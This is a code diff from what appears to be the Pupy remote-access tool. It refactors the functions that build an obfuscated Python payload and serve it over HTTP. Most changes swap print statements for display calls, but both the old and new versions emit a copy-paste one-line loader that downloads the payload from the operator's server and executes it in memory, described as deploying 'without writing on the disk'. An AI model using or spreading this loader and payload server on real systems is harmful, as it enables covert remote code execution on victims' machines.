@@ -7,8 +7,8 @@ from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 import re
 import os.path
 
+from pupylib.PupyOutput import Success, Warn, List
 from pupylib.utils.obfuscate import compress_encode_obfs
-from pupylib.utils.term import colorize
 from pupylib.payloads import dependencies
 from pupylib import ROOT
 
@@ -20,8 +20,8 @@ def getLinuxImportedModules():
         lines=f.read()
     return lines
 
-def pack_py_payload(conf, debug=False):
-    print colorize('[+] ','green')+'generating PY payload ...'
+def pack_py_payload(display, conf, debug=False):
+    display(Success('Generating PY payload ...'))
     fullpayload = []
 
     with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
@@ -62,7 +62,7 @@ def pack_py_payload(conf, debug=False):
     return compress_encode_obfs(payload, main=True)
 
 
-def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
+def serve_payload(display, payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
     class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
@@ -82,16 +82,16 @@ def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
                     port+=1
                 else:
                     raise
-        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
-        print " --- "
-        oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
-        print oneliner
-        print " --- "
 
-        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
-        print colorize("[+] ","green")+'waiting for a connection ...'
+        display(List([
+                "python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port),
+            ], caption=Success(
+                'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
+
+        display(Success('Started http server on %s:%s '%(ip, port)))
+        display(Success('Waiting for a connection ...'))
+
         server.serve_forever()
     except KeyboardInterrupt:
-        print 'KeyboardInterrupt received, shutting down the web server'
+        display(Warn('KeyboardInterrupt received, shutting down the web server'))
         server.socket.close()
-        exit()
